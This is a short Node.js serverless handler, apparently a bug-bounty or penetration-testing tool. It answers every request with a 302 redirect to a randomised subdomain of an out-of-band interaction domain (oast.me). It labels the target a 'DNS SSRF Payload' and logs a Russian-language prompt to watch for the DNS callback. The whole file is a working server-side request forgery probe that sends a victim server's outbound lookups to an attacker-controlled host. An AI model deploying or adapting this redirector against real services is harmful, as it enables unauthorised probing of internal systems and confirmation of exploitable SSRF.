module.exports = (req, res) => {
  const yourDomain = 'd4u09m4gtqki10fb6vbg766yw6ru9wgur.oast.me';
  const requestId = Math.random().toString(36).substring(2, 10); 
  const targetHost = `${requestId}.meta.internal-check.${yourDomain}`;
  const targetUrl = `http://${targetHost}/admin.php`;

  console.log('🎯 DNS SSRF Payload:', targetUrl);
  console.log('📡 Ожидай DNS-запроса для:', targetHost);

  res.writeHead(302, {
    'Location': targetUrl,
    'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0'
  });
  res.end();
};
